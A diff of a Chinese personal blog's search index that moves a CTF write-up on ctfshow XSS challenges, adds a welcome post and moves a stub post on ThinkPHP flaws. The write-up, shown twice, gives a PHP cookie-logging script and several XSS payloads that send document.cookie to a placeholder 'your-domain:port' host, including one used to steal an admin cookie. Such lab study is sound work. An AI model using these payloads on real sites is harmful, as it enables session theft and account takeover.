@@ -60,46 +60,15 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfshow-xss-wp</title>
-    <url>/2021/11/23/ctfshow-xss-wp/</url>
-    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
-<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
-<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+    <title>Hello World</title>
+    <url>/2022/01/16/blog0000-hello-world/</url>
+    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
 <span id="more"></span>
 
-<p>反射型常见trick：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试#试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
-<p>不过会有各种过滤</p>
-<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
-<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
-<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
-<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
-<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
-<p>顺利搞到管理员的cookie</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>xss</category>
-      </categories>
+<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
+]]></content>
       <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>wp</tag>
-        <tag>ctfshow</tag>
-        <tag>xss</tag>
+        <tag>preface</tag>
       </tags>
   </entry>
   <entry>
@@ -146,6 +115,23 @@
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThinkPhp的常见漏洞</title>
+    <url>/2021/09/04/thinkphp%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="一、信息泄露"><a href="#一、信息泄露" class="headerlink" title="一、信息泄露"></a>一、信息泄露</h2><p>开启了debug模式的ThinkPhp网站会在错误页面（404等）显示thinkphp版本信息。</p>
+<h2 id="二、RCE"><a href="#二、RCE" class="headerlink" title="二、RCE"></a>二、RCE</h2><p>有空再写…</p>
+<p>等我找到好用的图床</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>thinkphp</tag>
       </tags>
   </entry>
   <entry>
@@ -225,20 +211,46 @@
       </tags>
   </entry>
   <entry>
-    <title>ThinkPhp的常见漏洞</title>
-    <url>/2021/09/04/thinkphp%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="一、信息泄露"><a href="#一、信息泄露" class="headerlink" title="一、信息泄露"></a>一、信息泄露</h2><p>开启了debug模式的ThinkPhp网站会在错误页面（404等）显示thinkphp版本信息。</p>
-<h2 id="二、RCE"><a href="#二、RCE" class="headerlink" title="二、RCE"></a>二、RCE</h2><p>有空再写…</p>
-<p>等我找到好用的图床</p>
-]]></content>
+    <title>ctfshow-xss-wp</title>
+    <url>/2021/11/23/ctfshow-xss-wp/</url>
+    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
+<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
+<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+<span id="more"></span>
+
+<p>反射型常见trick：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试#试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
+<p>不过会有各种过滤</p>
+<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
+<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
+<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
+<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
+<p>顺利搞到管理员的cookie</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
       <categories>
         <category>ctf</category>
         <category>web</category>
+        <category>wp</category>
+        <category>xss</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>thinkphp</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
 </search>
